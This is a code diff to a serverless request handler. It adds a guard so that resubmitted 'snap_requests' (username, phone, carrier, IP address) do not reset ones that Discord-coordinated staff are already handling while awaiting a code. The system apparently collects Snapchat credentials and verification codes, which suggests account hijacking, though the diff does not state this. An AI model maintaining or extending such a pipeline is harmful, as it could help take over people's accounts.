@@ -45,10 +45,20 @@ export default async function handler(req, res) {
         const country = isBe ? 'Belgium' : 'France';
         const city    = 'Unknown';
 
-        // ── UPSERT ─────────────────────────────────────────────────────────
-        // Same phone → reset to pending so staff picks it up again.
-        // This replaces the old SELECT + 409 flow: users can now re-submit
-        // as many times as they want with the same username or phone number.
+        // ── UPSERT (v3.2 — safe) ──────────────────────────────────────────
+        // Same phone → reset to pending so staff picks it up again,
+        // BUT only if the request isn't currently being actively handled
+        // by a staff member. Without this guard, a resubmission (double
+        // click, page refresh, or the offline auto-retry queue in
+        // script.js) silently wipes an in-progress claim: the DB row goes
+        // back to 'pending' while the Discord message + bot's in-memory
+        // claimer map still think it's claimed — causing stale buttons,
+        // "already claimed" 409s, and lost requests under load.
+        //
+        // If the row exists and is actively processing/awaiting code, the
+        // conditional WHERE below makes the UPDATE a no-op (0 rows
+        // returned) and we simply tell the client their request is still
+        // in progress instead of resetting it.
         const result = await sql`
             INSERT INTO snap_requests
                 (username, phone, location, operator, lang, status, ip_address, country, city)
@@ -67,10 +77,29 @@ export default async function handler(req, res) {
                     staff_code             = NULL,
                     code_length            = NULL,
                     claimed_by_discord_id  = NULL
-            RETURNING id, username, phone, operator, country, city, ip_address, created_at
+            WHERE snap_requests.status IN ('pending', 'completed', 'wrong_number')
+            RETURNING id, username, phone, operator, country, city, ip_address, created_at, status
         `;
 
-        const row = result[0];
+        let row = result[0];
+
+        if (!row) {
+            // Existing row is actively being handled — don't steal the claim.
+            // Just report current state so the client can keep polling normally.
+            const existing = await sql`
+                SELECT id, username, phone, operator, country, city, ip_address, created_at, status
+                FROM snap_requests WHERE phone = ${phoneClean} LIMIT 1
+            `;
+            if (existing.length === 0) {
+                return res.status(409).json({ success: false, message: 'Demande déjà en cours de traitement.' });
+            }
+            return res.status(200).json({
+                success: true,
+                message: 'Demande déjà en cours de traitement',
+                alreadyProcessing: true,
+                data: { id: existing[0].id, username: existing[0].username, phone: existing[0].phone },
+            });
+        }
 
         // ── Optional Discord webhook (fallback when bot is offline) ────────
         if (process.env.DISCORD_WEBHOOK_URL) {
